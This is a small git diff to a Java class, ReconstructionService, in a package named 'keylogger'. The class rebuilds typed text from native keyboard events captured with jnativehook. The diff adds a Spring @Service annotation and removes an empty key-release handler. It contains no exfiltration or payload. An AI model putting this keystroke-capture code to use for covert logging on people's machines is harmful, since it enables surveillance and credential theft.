@@ -2,10 +2,12 @@ package com.keyguard.javakeyguard.keylogger.reconstruction;
 
 import com.github.kwhat.jnativehook.NativeInputEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import org.springframework.stereotype.Service;
 
 import java.util.HashMap;
 import java.util.Map;
 
+@Service
 public class ReconstructionService {
 
     private final StringBuilder buffer = new StringBuilder();
@@ -135,9 +137,6 @@ public class ReconstructionService {
             buffer.append(ch);
         }
 
-    }
-
-    public void handleKeyReleased() {
     }
 
     public String getCurrentText() {
